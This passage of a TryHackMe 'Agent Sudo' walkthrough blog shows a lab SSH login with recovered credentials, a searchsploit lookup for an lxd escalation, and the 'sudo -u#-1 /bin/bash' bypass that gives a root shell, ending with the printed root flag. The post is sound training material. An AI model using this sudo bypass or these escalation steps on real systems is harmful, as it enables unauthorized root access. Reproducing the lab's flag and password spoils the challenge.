drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> umar0x01 umar0x01  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>18</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>02</span> _cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>.</span><span style=color:#a6e22e>extracted</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01   <span style=color:#ae81ff>181</span> Apr <span style=color:#ae81ff>18</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>08</span> message<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>18</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>06</span> output
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> umar0x01 umar0x01   <span style=color:#ae81ff>217</span> Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>23</span><span style=color:#f92672>:</span><span style=color:#ae81ff>53</span> To_agentJ<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
                                                                                                                                                                                                                   
<span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> cat message<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>  
Hi james<span style=color:#f92672>,</span>

Glad you find <span style=color:#66d9ef>this</span> message<span style=color:#f92672>.</span> Your login password <span style=color:#66d9ef>is</span> hackerrules<span style=color:#f92672>!</span>

Don<span style=color:#960050;background-color:#1e0010>&#39;</span>t ask me why the password look cheesy<span style=color:#f92672>,</span> ask agent R who set <span style=color:#66d9ef>this</span> password <span style=color:#66d9ef>for</span> you<span style=color:#f92672>.</span>

Your buddy<span style=color:#f92672>,</span>
chris
</code></pre></div><p>Awesome! We got <strong>SSH</strong> credentials. Let&rsquo;s now SSH as user <strong>james</strong> with password <code>hackerrules!</code></p><hr><h2 id=initial-user>Initial User<a hidden class=anchor aria-hidden=true href=#initial-user>#</a></h2><p>Alright, we got <code>james</code> with the above <code>credentials</code>!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> ssh james<span style=color:#a6e22e>@10.10.107.2</span>                                                                                                                                                                                    <span style=color:#ae81ff>255</span> <span style=color:#960050;background-color:#1e0010>â¨¯</span>
The authenticity of host <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#f92672>)</span><span style=color:#960050;background-color:#1e0010>&#39;</span> can<span style=color:#960050;background-color:#1e0010>&#39;</span>t be established<span style=color:#f92672>.</span>
ECDSA key fingerprint <span style=color:#66d9ef>is</span> SHA256<span style=color:#f92672>:</span>yr7mJyy<span style=color:#f92672>+</span>j1G257OVtst3Zkl<span style=color:#f92672>+</span>zFQw8ZIBRmfLi7fX<span style=color:#f92672>/</span>D8<span style=color:#f92672>.</span>
Are you sure you want to <span style=color:#66d9ef>continue</span> <span style=color:#a6e22e>connecting</span> <span style=color:#f92672>(</span>yes<span style=color:#f92672>/</span>no<span style=color:#f92672>/[</span>fingerprint<span style=color:#f92672>])?</span> yes 
Warning: Permanently added <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span> to the list of known hosts<span style=color:#f92672>.</span>
james<span style=color:#a6e22e>@10.10.107.2</span><span style=color:#960050;background-color:#1e0010>&#39;</span>s password<span style=color:#f92672>:</span> 
Welcome to Ubuntu <span style=color:#ae81ff>18.04</span><span style=color:#f92672>.</span><span style=color:#a6e22e>3</span> <span style=color:#a6e22e>LTS</span> <span style=color:#f92672>(</span>GNU<span style=color:#f92672>/</span>Linux <span style=color:#ae81ff>4.15</span><span style=color:#f92672>.</span><span style=color:#a6e22e>0</span><span style=color:#f92672>-</span><span style=color:#ae81ff>55</span><span style=color:#f92672>-</span>generic x86_64<span style=color:#f92672>)</span>

 <span style=color:#f92672>*</span> Documentation<span style=color:#f92672>:</span>  https<span style=color:#f92672>:</span><span style=color:#75715e>//help.ubuntu.com
</span><span style=color:#75715e></span> <span style=color:#f92672>*</span> Management<span style=color:#f92672>:</span>     https<span style=color:#f92672>:</span><span style=color:#75715e>//landscape.canonical.com
</span><span style=color:#75715e></span> <span style=color:#f92672>*</span> Support<span style=color:#f92672>:</span>        https<span style=color:#f92672>:</span><span style=color:#75715e>//ubuntu.com/advantage
</span><span style=color:#75715e></span>
  System information as of Sat Apr <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>19</span><span style=color:#f92672>:</span><span style=color:#ae81ff>09</span><span style=color:#f92672>:</span><span style=color:#ae81ff>45</span> UTC <span style=color:#ae81ff>2021</span>

  System load<span style=color:#f92672>:</span>  <span style=color:#ae81ff>0.0</span>               Processes<span style=color:#f92672>:</span>           <span style=color:#ae81ff>95</span>
  Usage of <span style=color:#f92672>/:</span>   <span style=color:#ae81ff>39.7</span><span style=color:#f92672>%</span> of <span style=color:#ae81ff>9.78</span>GB   Users logged <span style=color:#66d9ef>in</span><span style=color:#f92672>:</span>     <span style=color:#ae81ff>0</span>
  Memory usage<span style=color:#f92672>:</span> <span style=color:#ae81ff>33</span><span style=color:#f92672>%</span>               IP address <span style=color:#66d9ef>for</span> eth0<span style=color:#f92672>:</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span>
  Swap usage<span style=color:#f92672>:</span>   <span style=color:#ae81ff>0</span><span style=color:#f92672>%</span>

<span style=color:#ae81ff>75</span> packages can be updated<span style=color:#f92672>.</span>
<span style=color:#ae81ff>33</span> updates are security updates<span style=color:#f92672>.</span>

Last login<span style=color:#f92672>:</span> Tue Oct <span style=color:#ae81ff>29</span> <span style=color:#ae81ff>14</span><span style=color:#f92672>:</span><span style=color:#ae81ff>26</span><span style=color:#f92672>:</span><span style=color:#ae81ff>27</span> <span style=color:#ae81ff>2019</span>
james<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:~</span>$ id
uid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span><span style=color:#f92672>(</span>james<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span><span style=color:#f92672>(</span>james<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span><span style=color:#f92672>(</span>james<span style=color:#f92672>),</span><span style=color:#ae81ff>4</span><span style=color:#f92672>(</span>adm<span style=color:#f92672>),</span><span style=color:#ae81ff>24</span><span style=color:#f92672>(</span>cdrom<span style=color:#f92672>),</span><span style=color:#ae81ff>27</span><span style=color:#f92672>(</span>sudo<span style=color:#f92672>),</span><span style=color:#ae81ff>30</span><span style=color:#f92672>(</span>dip<span style=color:#f92672>),</span><span style=color:#ae81ff>46</span><span style=color:#f92672>(</span>plugdev<span style=color:#f92672>),</span><span style=color:#ae81ff>108</span><span style=color:#f92672>(</span>lxd<span style=color:#f92672>)</span>
</code></pre></div><p>We can already see from <code>id</code> that it has <strong><code>lxd</code></strong> privileges â€” Let&rsquo;s search for the lxd exploit!</p><hr><h2 id=privileges-escalation>Privileges Escalation<a hidden class=anchor aria-hidden=true href=#privileges-escalation>#</a></h2><p>Let&rsquo;s run <code>searchsploit</code> against it.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> searchsploit lxd                    
<span style=color:#f92672>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span style=color:#f92672>---------------------------------</span>
 Exploit Title                                                                                                                                                                   <span style=color:#f92672>|</span>  Path
<span style=color:#f92672>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span style=color:#f92672>---------------------------------</span>
Ubuntu <span style=color:#ae81ff>18.04</span> <span style=color:#f92672>-</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>lxd<span style=color:#960050;background-color:#1e0010>&#39;</span> Privilege Escalation                                                                                                                                        <span style=color:#f92672>|</span> linux<span style=color:#f92672>/</span>local<span style=color:#f92672>/</span><span style=color:#ae81ff>46978.</span>sh
<span style=color:#f92672>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span style=color:#f92672>---------------------------------</span>
Shellcodes: No Results
</code></pre></div><p>I was able to <strong>root</strong> the system utilizing the above exploit^ but it seems the machine requires something else :|</p><p><img loading=lazy src=/images/thm-agent_sudo/Untitled%203.png alt></p><p>Running <code>sudo -l</code> we can see that we can&rsquo;t run a binary as root. Also remember the machine name lol? Let&rsquo;s look for <code>sudo agent</code> exploit.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>james<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:~</span>$ sudo <span style=color:#f92672>-</span>l 
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> james<span style=color:#f92672>:</span> 
Matching Defaults entries <span style=color:#66d9ef>for</span> james on agent<span style=color:#f92672>-</span>sudo<span style=color:#f92672>:</span>
    env_reset<span style=color:#f92672>,</span> mail_badpass<span style=color:#f92672>,</span> secure_path<span style=color:#f92672>=/</span>usr<span style=color:#f92672>/</span>local<span style=color:#f92672>/</span>sbin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>usr<span style=color:#f92672>/</span>local<span style=color:#f92672>/</span>bin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>usr<span style=color:#f92672>/</span>sbin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>sbin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>bin<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>:/</span>snap<span style=color:#f92672>/</span>bin

User james may run the following commands on agent<span style=color:#f92672>-</span>sudo<span style=color:#f92672>:</span>
    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>,</span> <span style=color:#f92672>!</span>root<span style=color:#f92672>)</span> <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>bash
james<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:~</span>$ 
james<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:~</span>$ sudo bash
Sorry<span style=color:#f92672>,</span> user james <span style=color:#66d9ef>is</span> not allowed to execute <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>bash<span style=color:#960050;background-color:#1e0010>&#39;</span> as root on agent<span style=color:#f92672>-</span>sudo<span style=color:#f92672>.</span>
</code></pre></div><p>Searching the exploit, we find out that there is one having same description!</p><p><a href=https://www.exploit-db.com/exploits/47502>https://www.exploit-db.com/exploits/47502</a></p><p><img loading=lazy src=/images/thm-agent_sudo/Untitled%204.png alt></p><p>From the <code>exploit description</code>, we can <strong>exploit</strong> it using:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>hacker<span style=color:#a6e22e>@kali</span><span style=color:#f92672>:~</span>$ sudo <span style=color:#f92672>-</span>u<span style=color:#960050;background-color:#1e0010>#</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>bash
root<span style=color:#a6e22e>@kali</span><span style=color:#f92672>:/</span>home<span style=color:#f92672>/</span>hacker<span style=color:#960050;background-color:#1e0010>#</span> id
</code></pre></div><h3 id=root-shell>Root Shell!<a hidden class=anchor aria-hidden=true href=#root-shell>#</a></h3><p>Let&rsquo;s run this on the machine:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>james<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:~</span>$ sudo <span style=color:#f92672>-</span>u<span style=color:#960050;background-color:#1e0010>#</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>bash
root<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:~</span><span style=color:#960050;background-color:#1e0010>#</span> 
root<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:~</span><span style=color:#960050;background-color:#1e0010>#</span> 
root<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:~</span><span style=color:#960050;background-color:#1e0010>#</span> 
root<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:~</span><span style=color:#960050;background-color:#1e0010>#</span> id
uid<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span><span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span><span style=color:#f92672>(</span>james<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span><span style=color:#f92672>(</span>james<span style=color:#f92672>)</span>
root<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:~</span><span style=color:#960050;background-color:#1e0010>#</span> cd <span style=color:#f92672>/</span>root<span style=color:#f92672>/</span>
root<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:/</span>root<span style=color:#960050;background-color:#1e0010>#</span> ls <span style=color:#f92672>-</span>al 
total <span style=color:#ae81ff>32</span>
drwx<span style=color:#f92672>------</span>  <span style=color:#ae81ff>4</span> root root <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> <span style=color:#f92672>.</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>24</span> root root <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> <span style=color:#f92672>..</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-------</span>  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>1952</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>bash_history</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span>  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>3106</span> Apr  <span style=color:#ae81ff>9</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>bashrc</span>
drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>local</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span>  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>148</span> Aug <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2015</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>profile</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span>  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>197</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> root<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
drwx<span style=color:#f92672>------</span>  <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>ssh</span>
</code></pre></div><p><strong>Alright, we got root.txt!</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>root<span style=color:#a6e22e>@agent</span><span style=color:#f92672>-</span>sudo<span style=color:#f92672>:/</span>root<span style=color:#960050;background-color:#1e0010>#</span> cat root<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
To Mr<span style=color:#f92672>.</span><span style=color:#a6e22e>hacker</span><span style=color:#f92672>,</span>

Congratulation on rooting <span style=color:#66d9ef>this</span> box<span style=color:#f92672>.</span> This box was designed <span style=color:#66d9ef>for</span> TryHackMe<span style=color:#f92672>.</span> Tips<span style=color:#f92672>,</span> always update your machine<span style=color:#f92672>.</span> 

Your flag <span style=color:#66d9ef>is</span> 
b53a02f55b57d4439e3341834d70c062

By<span style=color:#f92672>,</span>
DesKel a<span style=color:#f92672>.</span><span style=color:#a6e22e>k</span><span style=color:#f92672>.</span><span style=color:#a6e22e>a</span> Agent R
</code></pre></div><blockquote><p>(Bonus) Who is Agent R?</p></blockquote><p>From the <code>root.txt</code> flag: <strong>DesKel</strong></p><p>Thanks for reading! Hopefully you enjoyed this walkthrough.</p><hr><h2 id=note-to-self>Note to self:<a hidden class=anchor aria-hidden=true href=#note-to-self>#</a></h2><ul><li>Always enumerate before bruteforcing (keep it as a last resort)</li><li>Read through the hints on rooms (this one was really specific :|)</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://umar0x01.sh/tags/ftp/>ftp</a></li><li><a href=https://umar0x01.sh/tags/ssh/>ssh</a></li><li><a href=https://umar0x01.sh/tags/http/>http</a></li><li><a href=https://umar0x01.sh/tags/rustscan/>rustscan</a></li><li><a href=https://umar0x01.sh/tags/enumeration/>enumeration</a></li><li><a href=https://umar0x01.sh/tags/hydra-ftp-bruteforcing/>hydra-ftp-bruteforcing</a></li><li><a href=https://umar0x01.sh/tags/steganography/>steganography</a></li><li><a href=https://umar0x01.sh/tags/john-zip-cracking/>john-zip-cracking</a></li><li><a href=https://umar0x01.sh/tags/privesc/>privesc</a></li><li><a href=https://umar0x01.sh/tags/sudo-exploitation/>sudo-exploitation</a></li></ul><nav class=paginav><a class=prev href=https://umar0x01.sh/post/overpass-tryhackme/><span class=title>Â« Prev Page</span><br><span>TryHackMe - Overpass</span></a>
<a class=next href=https://umar0x01.sh/post/brute_it-thm/><span class=title>Next Page Â»</span><br><span>TryHackMe - Brute It</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Agent Sudo on twitter" href="https://twitter.com/intent/tweet/?text=TryHackMe%20-%20Agent%20Sudo&url=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-agent_sudo%2f&hashtags=ftp%2cssh%2chttp%2crustscan%2cenumeration%2chydra-ftp-bruteforcing%2csteganography%2cjohn-zip-cracking%2cprivesc%2csudo-exploitation"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Agent Sudo on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-agent_sudo%2f&title=TryHackMe%20-%20Agent%20Sudo&summary=TryHackMe%20-%20Agent%20Sudo&source=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-agent_sudo%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Agent Sudo on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-agent_sudo%2f&title=TryHackMe%20-%20Agent%20Sudo"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Agent Sudo on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-agent_sudo%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Agent Sudo on whatsapp" href="https://api.whatsapp.com/send?text=TryHackMe%20-%20Agent%20Sudo%20-%20https%3a%2f%2fumar0x01.sh%2fpost%2fthm-agent_sudo%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Agent Sudo on telegram" href="https://telegram.me/share/url?text=TryHackMe%20-%20Agent%20Sudo&url=https%3a%2f%2fumar0x01.sh%2fpost%2fthm-agent_sudo%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 